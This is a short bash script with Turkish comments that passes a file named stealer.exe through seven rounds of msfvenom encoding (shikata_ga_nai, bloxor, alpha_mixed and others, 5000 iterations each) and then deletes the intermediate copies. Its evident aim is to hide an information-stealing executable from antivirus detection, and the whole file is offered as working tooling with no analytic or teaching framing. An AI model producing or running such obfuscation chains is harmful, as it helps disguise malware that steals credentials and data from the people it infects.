#!/bin/bash

# İlk encode işlemi
msfvenom -x stealer.exe -p generic/custom --arch x86 -e x86/jmp_call_additive -i 5000 -f exe -o temp_stealer.exe

# İkinci encode işlemi
msfvenom -x temp_stealer.exe -p generic/custom --arch x86 -e x86/shikata_ga_nai -i 5000 -f exe -o temp_stealer_v2.exe

# Üçüncü encode işlemi
msfvenom -x temp_stealer_v2.exe -p generic/custom --arch x86 -e x86/bloxor -i 5000 -f exe -o temp_stealer_v3.exe

# Dördüncü encode işlemi
msfvenom -x temp_stealer_v3.exe -p generic/custom --arch x86 -e x86/fnstenv_mov -i 5000 -f exe -o temp_stealer_v4.exe

# Beşinci encode işlemi
msfvenom -x temp_stealer_v4.exe -p generic/custom --arch x86 -e x86/alpha_mixed -i 5000 -f exe -o temp_stealer_v5.exe

# Altıncı encode işlemi
msfvenom -x temp_stealer_v5.exe -p generic/custom --arch x86 -e x86/service -i 5000 -f exe -o temp_stealer_v6.exe

# Yedinci encode işlemi
msfvenom -x temp_stealer_v6.exe -p generic/custom --arch x86 -e x86/nonalpha -i 5000 -f exe -o stealer.exe

# Temizlik (isteğe bağlı)
rm temp_stealer.exe temp_stealer_v2.exe temp_stealer_v3.exe temp_stealer_v4.exe temp_stealer_v5.exe temp_stealer_v6.exe
